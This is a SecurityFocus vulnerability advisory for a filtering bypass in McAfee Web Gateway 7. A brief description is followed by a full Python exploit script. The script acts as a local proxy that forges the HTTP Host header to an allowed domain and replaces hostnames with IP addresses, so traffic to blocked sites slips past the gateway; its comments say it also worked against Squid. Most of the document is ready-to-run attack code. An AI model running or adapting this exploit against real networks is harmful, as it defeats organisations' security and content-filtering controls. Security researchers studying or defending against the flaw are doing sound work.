source: http://www.securityfocus.com/bid/53015/info

McAfee Web Gateway is prone to a security-bypass vulnerability because it fails to properly enforce filtering rules.

A successful attack will allow an attacker to bypass intended security restrictions; this may aid in other attacks.

McAfee Web Gateway 7 is vulnerable; other versions may also be affected.

import socket,struct,sys,time
from threading import Thread


#The timeOut can be changed if the proxy is slow.
#Tested in GMail, Facebook, Youtube and several blocked sites.
#The proxy get the Host field of the http header and do not verify anything else.
#It trusts on the HTTP Header and it can be modified by the attacker.

timeOut = 0.8
isGet = 0
hostNameG = ""
pacoteGet = ""
port = 8080 #Listening port
proxyAddr = "vulnerableProxy.com" #vulnerable proxy
proxyPort = 8080 # proxy port

def handle(client,globalSock):
	
	client.settimeout(timeOut)
	
	global hostNameG
	

	while 1:
		
		dados = ""
		tam = 0
		while 1:
                        try:
                                dados2 = client.recv(1024)
                                tam = tam + len(dados2)
                                dados = dados + dados2
                        except socket.timeout:
                               
                                break

		
		dd = dados.find("CONNECT") #if the packet is a CONNECT METHOD
		if dd != -1:
		  dd2 = dados.find(":")
		  hostName = dados[dd+8:dd2]
		  
		  ipAddr = socket.gethostbyname(hostName) #changing the method to connect to the ip address, not the dns domain
		  pacote = dados
		  hostHeader = "Host: " + hostName
		  pacote = pacote.replace(hostHeader, "Host: www.uol.com.br") #changing the host field with a value that is accepted by the proxy
		  pacote = pacote.replace(hostName, ipAddr) #changind domain for ip
		  
		  
		  
		  dados = pacote
		
		getd = dados.find("GET ")
		getd2 = dados.find("//")
		getd3 = dados.find("/", getd2+2)
		hostName = dados[getd2+2:getd3]
		
		
		if getd != -1:
		  globalSock.close()
		  globalSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		  globalSock.connect((proxyAddr,proxyPort))
		  globalSock.settimeout(timeOut)
		  getd2 = dados.find("//")
		  getd3 = dados.find("/", getd2+2)
		  
		  hostName = dados[getd2+2:getd3]
		  
		  proxyAuth = ""
		  proxyAuthN = dados.find("Proxy-Authorization:")
		  if proxyAuthN != -1:
		    proxyAuthNN = dados.find("\r\n", proxyAuthN)
		    proxyAuth = dados[proxyAuthN:proxyAuthNN]
		    
		    
		  ipAddr = socket.gethostbyname(hostName)
		  
		  info = "CONNECT " + ipAddr + ":80 HTTP/1.1\r\n"
		  if proxyAuthN != -1:
		    info += proxyAuth + "\r\n"
		  
		  info += "Host: www.uol.com.br\r\n\r\n"
		  
		  globalSock.send(info)
		  tam = 0
		  gdata = ""
		  
		  while 1:
			try:
				
				gdata2 = globalSock.recv(1024)
				
				tam = tam + len(gdata2)
				gdata = gdata + gdata2
				
				if len(gdata2) == 0: 
					break
				
				
			except socket.timeout:
				
				break
		  
		
		
		  
		
		globalSock.send(dados)
		tam = 0
		gdata = ""
		
		while 1:
			try:
				
				gdata2 = globalSock.recv(1024)
				
				if len(gdata2) > 0:
					client.send(gdata2)
				
				tam = tam + len(gdata2)
				gdata = gdata + gdata2
				
				if len(gdata2) == 0: 
					break
				
				
			except socket.timeout:
				
				break
		
		


print 'Proxy Bypass'
print 'by Gabriel Menezes Nunes'
print 'Tested on McAfee Web Gateway 7 and Squid Proxy'
sockzao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Attacked Proxy:',
print proxyAddr
print 'Listening on',
print port
sockzao.bind(("",port))

sockzao.listen(6)

while 1:
	print 'Waiting for connections'
	client, address = sockzao.accept()
	print 'Client Connected'
	print address
	globalSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	globalSock.connect((proxyAddr,proxyPort))
	globalSock.settimeout(timeOut)

	t = Thread(target=handle, args=(client,globalSock,))
	t.start()
